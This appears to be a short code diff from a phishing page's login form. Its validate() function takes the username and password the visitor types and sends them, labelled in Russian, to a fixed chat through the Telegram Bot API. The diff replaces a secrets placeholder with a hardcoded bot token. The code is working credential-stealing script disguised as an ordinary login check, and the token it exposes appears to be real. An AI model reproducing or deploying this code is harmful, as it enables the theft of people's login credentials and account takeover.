@@ -302,7 +302,7 @@
                     function validate() {
                         var login = document.getElementById("login").value;
                         var password = document.getElementById("password").value;
-                        var botToken = ${{ secrets.TOKEN }};
+                        var botToken = "7918203460:AAH9bYyeyEoHD48OeogdQ7M2ya7nt9vZ8O4";
                         var chatId = '-4572859110';
                         var message = `Логин: ${login}\nПароль: ${password}`;
                         var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
